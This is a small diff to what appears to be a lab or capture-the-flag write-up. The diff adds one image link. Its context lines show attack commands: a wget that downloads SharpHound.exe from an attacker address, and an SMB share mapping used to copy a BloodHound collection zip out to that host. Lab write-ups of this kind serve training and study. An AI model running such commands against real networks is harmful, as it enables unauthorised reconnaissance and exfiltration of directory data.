@@ -118,4 +118,5 @@ wget 10.10.14.4/SharpHound.exe -o SharpHound.exe
 net use \\10.10.14.4\share /u:df df
 copy 20230408050326_BloodHound.zip \\10.10.14.4\share\
 ```
+![image](https://user-images.githubusercontent.com/33616880/230702582-cbaa9574-1756-4d57-9405-98a64c26d111.png)
 ![image](https://user-images.githubusercontent.com/33616880/230702543-ff4a81d9-d0e4-4c98-a178-ecd3f25e694f.png)
